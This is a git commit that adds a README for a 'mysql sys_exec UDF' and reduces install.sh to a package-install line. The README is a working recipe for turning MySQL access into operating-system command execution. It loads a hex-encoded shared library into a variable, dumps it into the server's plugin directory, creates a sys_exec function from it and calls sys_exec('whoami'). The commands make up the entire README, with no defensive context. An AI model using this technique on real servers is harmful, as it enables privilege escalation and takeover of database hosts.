0017dd3a1893411b2e7ef7e1216c5da49bdb198e
kp <contact@kernel-panik.me>
2021-05-30 10:50:52 +0200

    Compile my own

---
+++ README.md
@@ -0,0 +1,17 @@
+mysql sys_exec UDF
+==================
+
+Manual
+======
+
+        # copy clipboard hex values
+        cat lib_mysqludf_sys.so.hex | xclip -selection c
+        # set vars with hex values
+        set @shell =  0x${lib_mysqludf_sys.so.hex};
+        # retrieve plugin dir path
+        select @@plugin_dir;
+        select binary @shell into dumpfile '${plugin_di_path}/udf_sys_exec.so';
+        create function sys_exec returns int soname 'udf_sys_exec.so';
+        select * from mysql.func where name='sys_exec';
+        select sys_exec('whoami');
+
--- install.sh
+++ install.sh
@@ -19,25 +19,4 @@
 # License along with this library; if not, write to the Free Software
 # Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 
-echo "Compiling the MySQL UDF"
-make
-
-if test $? -ne 0; then
-	echo "ERROR: You need libmysqlclient development software installed "
-	echo "to be able to compile this UDF, on Debian/Ubuntu just run:"
-	echo "apt-get install libmysqlclient15-dev"
-	exit 1
-else
-	echo "MySQL UDF compiled successfully"
-fi
-
-echo -e "\nPlease provide your MySQL root password"
-
-mysql -u root -p mysql < lib_mysqludf_sys.sql
-
-if test $? -ne 0; then
-	echo "ERROR: unable to install the UDF"
-	exit 1
-else
-	echo "MySQL UDF installed successfully"
-fi
+sudo apt-get install default-libmysqlclient-dev default-libmysqld-dev
